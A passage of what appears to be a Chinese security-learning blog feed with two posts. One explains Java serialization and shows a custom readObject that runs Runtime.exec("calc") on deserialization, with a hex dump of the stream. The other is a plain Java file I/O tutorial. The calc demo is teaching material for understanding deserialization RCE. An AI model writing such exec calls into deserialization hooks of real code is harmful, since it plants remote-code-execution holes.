class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">/*序列化后的数据可以设为一个byte数组流，也可以写入文件；无论套哪个流，oos都需要writeObject-&gt;flush-&gt;close*/</span><br>            <span class="hljs-comment">//ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br>            DeserializeTest t = <span class="hljs-keyword">new</span> DeserializeTest();<br>            t.setEmail(<span class="hljs-string">&quot;admin@gmail.com&quot;</span>);<br>            t.setUsername(<span class="hljs-string">&quot;Georg&quot;</span>);<br><br>            <span class="hljs-comment">//使用ObjectOutputStream套入baos并写入到流中</span><br>            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./2.txt&quot;</span>)));<br>            oos.writeObject(t);<br>            oos.flush();<br>            oos.close();<br><br><br>            <span class="hljs-comment">//System.out.println(&quot;Deserialization:&quot;+ Arrays.toString(baos.toByteArray()));</span><br>            <span class="hljs-comment">//ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br>            <span class="hljs-comment">//ObjectInputStream ois = new ObjectInputStream(bais);</span><br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./2.txt&quot;</span>)));<br>            DeserializeTest deObject = (DeserializeTest) ois.readObject();<br>            System.out.println(<span class="hljs-string">&quot;username:&quot;</span>+deObject.username+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-string">&quot;email:&quot;</span>+deObject.email);<br>            ois.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>java.io.Externalizable</code>和<code>java.io.Serializable</code>几乎一样，但需要重写<code>writeExternal、readExternal</code></p><p>如果重写/恶意构造反序列化方法，可能导致命令执行</p><p>对上述代码进行改编：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *ClassName: DeserializeTest</span><br><span class="hljs-comment"> *Description: A Class for learning Serialize and Deserialize</span><br><span class="hljs-comment"> *Author: zZ</span><br><span class="hljs-comment"> *Time: 2022/7/27</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> String username;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getEmail</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEmail</span><span class="hljs-params">(String email)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.email = email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br>            DeserializeTest t = <span class="hljs-keyword">new</span> DeserializeTest();<br>            t.setEmail(<span class="hljs-string">&quot;admin@gmail.com&quot;</span>);<br>            t.setUsername(<span class="hljs-string">&quot;Georg&quot;</span>);<br><br>            <span class="hljs-comment">//使用ObjectOutputStream套入baos并写入到流中</span><br>            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./2.txt&quot;</span>)));<br>            oos.writeObject(t);<br>            oos.flush();<br>            oos.close();<br><br><br>            <span class="hljs-comment">//System.out.println(&quot;Deserialization:&quot;+ Arrays.toString(baos.toByteArray()));</span><br>            <span class="hljs-comment">//ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br>            <span class="hljs-comment">//ObjectInputStream ois = new ObjectInputStream(bais);</span><br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./2.txt&quot;</span>)));<br>            DeserializeTest deObject = (DeserializeTest) ois.readObject();<br>            System.out.println(<span class="hljs-string">&quot;username:&quot;</span>+deObject.username+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-string">&quot;email:&quot;</span>+deObject.email);<br>            ois.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当<code>readObject()</code>可以被恶意构造的或者反序列化链能够控制到<code>-&gt;readObject()</code>就能RCE了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-title">A</span><span class="hljs-params">(String username,<span class="hljs-keyword">int</span> id)</span></span>&#123;<span class="hljs-keyword">this</span>.username=username;<span class="hljs-keyword">this</span>.id=id;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        oos.defaultWriteObject();<br>        oos.writeObject(<span class="hljs-string">&quot;i add the string here&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ois.defaultReadObject();<br>        System.out.println((String) ois.readObject());<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeAtt</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            A a = <span class="hljs-keyword">new</span> A(<span class="hljs-string">&quot;Georg&quot;</span>, <span class="hljs-number">12</span>);<br>            ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>            oos.writeObject(a);<br>            oos.flush();<br>            oos.close();<br><br>            ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>            ois.readObject();<br>ois.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这边需要获取其16进制的序列化数据，那么可以文件写出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-title">A</span><span class="hljs-params">(String username,<span class="hljs-keyword">int</span> id)</span></span>&#123;<span class="hljs-keyword">this</span>.username=username;<span class="hljs-keyword">this</span>.id=id;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        oos.defaultWriteObject();<br>        oos.writeObject(<span class="hljs-string">&quot;i add the string here&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ois.defaultReadObject();<br>        System.out.println((String) ois.readObject());<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeAtt</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            A a = <span class="hljs-keyword">new</span> A(<span class="hljs-string">&quot;Georg&quot;</span>, <span class="hljs-number">12</span>);<br><span class="hljs-comment">//            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//            ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br>            <br>            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./1&quot;</span>)));<br>            <br>            oos.writeObject(a);<br>            oos.flush();<br>            oos.close();<br><br><span class="hljs-comment">//            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="hljs-comment">//            ObjectInputStream ois = new ObjectInputStream(bais);</span><br>            <br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./1&quot;</span>)));<br>            ois.readObject();<br>ois.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件1得到其16进制数值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">λ java -jar SerializationDumper-v1.13.jar <span class="hljs-string">&quot;ACED00057372000B6D796A6176617365632E4197F88148C57B592E 03000249000269644C0008757365726E616D657400124C6A6176612F6C616E672F537472696E673B78700000000C74000547656F726774001569206164642074686520737472696E67206865726578&quot;</span><br><br>STREAM_MAGIC - 0xac ed<br>STREAM_VERSION - 0x00 05<br>Contents<br>  TC_OBJECT - 0x73<br>    TC_CLASSDESC - 0x72<br>      className<br>        Length - 11 - 0x00 0b<br>        Value - myjavasec.A - 0x6d796a6176617365632e41<br>      serialVersionUID - 0x97 f8 81 48 c5 7b 59 2e<br>      newHandle 0x00 7e 00 00<br>      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE<br>      fieldCount - 2 - 0x00 02<br>      Fields<br>        0:<br>          Int - I - 0x49<br>          fieldName<br>            Length - 2 - 0x00 02<br>            Value - id - 0x6964<br>        1:<br>          Object - L - 0x4c<br>          fieldName<br>            Length - 8 - 0x00 08<br>            Value - username - 0x757365726e616d65<br>          className1<br>            TC_STRING - 0x74<br>              newHandle 0x00 7e 00 01<br>              Length - 18 - 0x00 12<br>              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b<br>      classAnnotations<br>        TC_ENDBLOCKDATA - 0x78<br>      superClassDesc<br>        TC_NULL - 0x70<br>    newHandle 0x00 7e 00 02<br>    classdata<br>      myjavasec.A<br>        values<br>          id<br>            (int)12 - 0x00 00 00 0c<br>          username<br>            (object)<br>              TC_STRING - 0x74<br>                newHandle 0x00 7e 00 03<br>                Length - 5 - 0x00 05<br>                Value - Georg - 0x47656f7267<br>        objectAnnotation<br>          TC_STRING - 0x74<br>            newHandle 0x00 7e 00 04<br>            Length - 21 - 0x00 15<br>            Value - i add the string here - 0x69206164642074686520737472696e672068657265<br>          TC_ENDBLOCKDATA - 0x78<br></code></pre></td></tr></table></figure><p>可见自定义的<code>writeObject</code>写入的<code>i add the string here</code>放在了<code>objectAnnotation</code>，在反序列化时，自定义的恶意<code>readObject</code>进行了<code>exec</code>并且也读取到了这个字符串</p><blockquote><p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是 ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用 readObject ，开发者也可以从中读取出前面写入的内容，并进行处理</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java读写文件</title>
    <link href="/2023/03/15/Java%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/"/>
    <url>/2023/03/15/Java%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Java读写文件"><a href="#Java读写文件" class="headerlink" title="Java读写文件"></a>Java读写文件</h1><p><a href="https://blog.csdn.net/jingzi123456789/article/details/72123937">Java流参考</a></p><h2 id="java-io-FileSystem"><a href="#java-io-FileSystem" class="headerlink" title="java.io.FileSystem"></a>java.io.FileSystem</h2><p>FileInputStream类读文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">//打开文件对象并创建文件输入流</span><br>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;C:\\Windows\\System32\\drivers\\etc\\hosts&quot;</span>);<br>        <span class="hljs-comment">//定义每次输入流读取到的字节数对象</span><br>        <span class="hljs-keyword">int</span> a = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//定义缓冲区大小</span><br>        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-comment">//创建byte数组输出对象</span><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        <span class="hljs-comment">//循环读取，read(bytes)方法返回本次读取到的字节个数，且将读取到的字节存储到bytes中，或当到达文件尾部时返回-1</span><br>        <span class="hljs-keyword">while</span> ((a=fileInputStream.read(bytes))!=-<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-comment">//输入流read即a写入bytes数组(数组下标从0开始)</span><br>            byteArrayOutputStream.write(bytes,<span class="hljs-number">0</span>,a);<br>        &#125;<br>        System.out.println(byteArrayOutputStream.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>FileOutputStream类写文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;D:/1.txt&quot;</span>);<span class="hljs-comment">//这样不会创建出文件，必须FileOutputStream.write方法写出文件</span><br>        String content = <span class="hljs-string">&quot;Nothing is better than learning&quot;</span>;<br>        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(file);<br>        fileOutputStream.write(content.getBytes());<br>        fileOutputStream.flush();<br>        fileOutputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再介绍缓冲IO流</p><p>BufferedInputStream类读文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;D:/1.txt&quot;</span>);<br>        BufferedInputStream bufferedInputStream = <span class="hljs-keyword">new</span> BufferedInputStream(fileInputStream);<br>        String content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> flag = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((flag=bufferedInputStream.read(buffer))!=-<span class="hljs-number">1</span>)&#123;<br>            content=<span class="hljs-keyword">new</span> String(buffer,<span class="hljs-number">0</span>,flag);<br>        &#125;<br>        System.out.println(content);<br>        bufferedInputStream.close();<span class="hljs-comment">//只需要关闭最外层的流即可</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>BufferedInputStream包装了一个FileInputStream，那么先关BufferedInputStream，再关FileInputStream。一般处理流持有节点流引用，处理流都会在自己的close方法中去关闭节点流，因此我们只要关闭外层的处理流即可，所以只要关闭BufferedInputStream即可</p></blockquote><p>BufferedOutputStream类写文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;D:/2.txt&quot;</span>);<br>        BufferedOutputStream bufferedOutputStream = <span class="hljs-keyword">new</span> BufferedOutputStream(fileOutputStream);<br>        String contents = <span class="hljs-string">&quot;hello world&quot;</span>;<br>        bufferedOutputStream.write(contents.getBytes());<br>        bufferedOutputStream.flush();<br>        bufferedOutputStream.close();<span class="hljs-comment">//只需要关闭最外层的流即可</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RandomAccessFile"><a href="#RandomAccessFile" class="headerlink" title="RandomAccessFile"></a>RandomAccessFile</h2><p>读和写文件需要new两个类，并且方法并不多，使用RandomAccessFile可以更方便</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220316214144844.png"></p><p>构造函数中可见有四种模式，并且有丰富的读写方法</p><p>使用的时候只需要改变包装file流为RandomAccessFile，并且指定模式即可</p><p>写文件的模式值得注意，追加还是覆盖要慎重</p><h2 id="FileSystemProvider"><a href="#FileSystemProvider" class="headerlink" title="FileSystemProvider"></a>FileSystemProvider</h2><p>读文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><span class="hljs-comment">//File file = new File(&quot;D:/1.txt&quot;);//Files.readAllBytes()需要传进path</span><br>        Path path = Paths.get(<span class="hljs-string">&quot;D:/1.txt&quot;</span>);<br>        <span class="hljs-comment">//或者可以file定义文件，然后toPath返回路径</span><br>        <span class="hljs-comment">//Path path1=file.toPath();</span><br>        <span class="hljs-keyword">byte</span>[] bytes = Files.readAllBytes(path);<br>        <span class="hljs-comment">//byte[] bytes1 = Files.readAllBytes(path1);</span><br>        System.out.println(<span class="hljs-keyword">new</span> String(bytes));<br>        <span class="hljs-comment">//System.out.println(new String(bytes1));</span><br>    